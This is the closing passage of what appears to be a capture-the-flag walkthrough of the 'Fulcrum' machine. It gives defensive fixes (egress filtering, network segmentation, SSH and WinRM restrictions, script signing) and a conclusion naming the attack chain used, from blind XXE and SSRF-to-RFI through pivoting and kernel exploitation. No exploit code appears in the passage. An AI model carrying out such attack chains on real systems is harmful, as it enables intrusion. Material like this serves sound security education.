</span></span></code></pre></div></li><li>Sign scripts with a trusted certificate to prevent unauthorized modifications:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Set-AuthenticodeSignature -FilePath script.ps1 -Certificate (Get-ChildItem Cert<span style=color:#960050;background-color:#1e0010>:</span>\CurrentUser\My -CodeSigningCert)
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=10-network-configuration>10. Network Configuration<a href=#10-network-configuration class=hanchor arialabel=Anchor>#</a></h3><p><strong>System</strong>: Network infrastructure (Fulcrum host and internal VMs)</p><h4 id=gap-15-unrestricted-outbound-network-access>Gap 15: Unrestricted Outbound Network Access<a href=#gap-15-unrestricted-outbound-network-access class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The Fulcrum server allowed outbound connections to the attacker&rsquo;s server ([ATTACKER-IP]), enabling XXE and SSRF exploitation.</li><li><strong>Impact</strong>: Facilitated data exfiltration and remote code execution.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Implement egress filtering to block outbound connections except to necessary services:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>iptables -A OUTPUT -p tcp --dport <span style=color:#ae81ff>80</span> -d &lt;trusted_ips&gt; -j ACCEPT
</span></span><span style=display:flex><span>iptables -A OUTPUT -p tcp --dport <span style=color:#ae81ff>443</span> -d &lt;trusted_ips&gt; -j ACCEPT
</span></span><span style=display:flex><span>iptables -A OUTPUT -j DROP
</span></span></code></pre></div></li><li>Use a proxy server for outbound traffic and monitor for suspicious requests.</li></ul></li></ul></li></ul><h4 id=gap-16-exposed-internal-services>Gap 16: Exposed Internal Services<a href=#gap-16-exposed-internal-services class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: Internal services (e.g., WinRM on 192.168.122.28:5986) were accessible via SSH tunneling from the compromised Fulcrum server.</li><li><strong>Impact</strong>: Allowed pivoting to internal Windows servers.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Segment the network using VLANs or firewalls to isolate the hypervisor, web server, file server, and domain controller:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># In pfSense or similar firewall:
</span></span><span style=display:flex><span># Create VLANs for DMZ (web server), internal servers (file, DC), and hypervisor
</span></span><span style=display:flex><span># Deny traffic between VLANs unless explicitly allowed
</span></span></code></pre></div></li><li>Disable SSH access for the <code>www-data</code> user or restrict SSH to specific commands:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># In /etc/ssh/sshd_config</span>
</span></span><span style=display:flex><span>Match User www-data
</span></span><span style=display:flex><span>    AllowTcpForwarding no
</span></span><span style=display:flex><span>    PermitOpen none
</span></span></code></pre></div></li><li>Restrict WinRM to internal IPs only (as described in Gap 11).</li></ul></li></ul></li></ul><hr><h3 id=summary-of-fixes>Summary of Fixes<a href=#summary-of-fixes class=hanchor arialabel=Anchor>#</a></h3><ol><li><strong>Nginx Web Server</strong>:<ul><li>Prevent SSRF/RFI with input validation and <code>open_basedir</code>.</li><li>Correct misleading error messages with proper error pages.</li></ul></li><li><strong>Custom API</strong>:<ul><li>Disable XXE processing and restrict outbound connections.</li></ul></li><li><strong>PHPMyAdmin</strong>:<ul><li>Restrict access by IP, enable strong authentication, and verify lockout mechanisms.</li></ul></li><li><strong>pfSense</strong>:<ul><li>Limit access to internal IPs, strengthen lockout policies, and enable 2FA.</li></ul></li><li><strong>Ubuntu System</strong>:<ul><li>Patch the kernel, restrict VMDK file access, and minimize <code>www-data</code> privileges.</li></ul></li><li><strong>Windows File Server</strong>:<ul><li>Secure Netlogon share and remove hardcoded credentials.</li></ul></li><li><strong>Windows Web Server</strong>:<ul><li>Restrict WinRM access and enforce HTTPS.</li></ul></li><li><strong>Active Directory</strong>:<ul><li>Enforce strong passwords, limit user permissions, and monitor for suspicious activity.</li></ul></li><li><strong>PowerShell Scripts</strong>:<ul><li>Remove hardcoded credentials, use constrained language mode, and sign scripts.</li></ul></li><li><strong>Network</strong>:<ul><li>Implement egress filtering and network segmentation to limit internal access.</li></ul></li></ol><p>These fixes address the identified vulnerabilities through a combination of source code changes (e.g., input validation, secure credential handling) and configuration hardening (e.g., firewall rules, permission restrictions), significantly improving the security posture of the Fulcrum environment.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Fulcrum is an excellent machine that demonstrates the complexity of hybrid environments mixing Linux hosts, Windows domains, and virtualized infrastructure. It requires expertise in:</p><ul><li>Blind XXE exploitation and automation techniques</li><li>SSRF to RFI attack chaining for initial access</li><li>PowerShell credential handling and decryption</li><li>Active Directory enumeration with PowerView</li><li>WinRM pivoting and command execution</li><li>Network tunneling and multi-hop exploitation</li><li>VMware VMDK file analysis and mounting</li><li>Kernel exploitation for privilege escalation</li></ul><p>The machine emphasizes the importance of proper input validation, secure credential storage, network segmentation, regular patching, and the principle of least privilege across both Linux and Windows environments.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>